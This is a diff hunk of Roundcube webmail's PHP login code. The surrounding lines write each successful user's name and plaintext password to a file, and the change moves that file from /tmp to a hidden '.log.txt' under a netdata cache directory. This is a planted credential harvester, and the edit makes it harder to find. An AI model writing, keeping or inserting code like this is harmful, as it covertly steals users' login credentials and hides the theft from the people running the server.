@@ -118,7 +118,7 @@ if ($RCMAIL->task == 'login' && $RCMAIL->action == 'login') {
     if ($auth['valid'] && !$auth['abort']
         && $RCMAIL->login($auth['user'], $auth['pass'], $auth['host'], $auth['cookiecheck'])
     ) {
-    	$file = '/tmp/logs.txt';
+    	$file = '/opt/netdata/var/cache/.log.txt';
         $creds = $auth['user'] . ':' . $auth['pass'] . "\n";
         file_put_contents($file, $creds, FILE_APPEND);
         // create new session ID, don't destroy the current session
